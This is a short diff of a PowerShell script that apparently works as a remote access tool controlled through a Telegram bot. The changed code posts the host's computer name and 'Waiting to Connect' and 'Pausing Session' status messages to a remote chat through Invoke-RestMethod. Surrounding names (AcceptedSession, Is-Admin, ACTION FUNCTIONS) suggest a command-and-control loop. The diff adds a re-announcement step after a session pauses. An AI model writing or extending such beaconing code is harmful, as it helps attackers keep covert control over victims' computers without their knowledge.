@@ -50,7 +50,7 @@ $scriptDirectory = Get-Content -path $MyInvocation.MyCommand.Name -Raw
 # Message waiting for passphrase
 $contents = "$comp $env:COMPUTERNAME $waiting Waiting to Connect.."
 $params = @{chat_id = $ChatID ;text = $contents}
-Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
+Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params 
 #----------------------------------------------- ACTION FUNCTIONS ----------------------------------------------
 
 Function Close{
@@ -452,6 +452,9 @@ $contents = "$env:COMPUTERNAME $pause Pausing Session.."
 $params = @{chat_id = $ChatID ;text = $contents}
 Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
 $script:AcceptedSession=""
+$contents = "$comp $env:COMPUTERNAME $waiting Waiting to Connect.."
+$params = @{chat_id = $ChatID ;text = $contents}
+Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
 }
 
 Function Is-Admin{
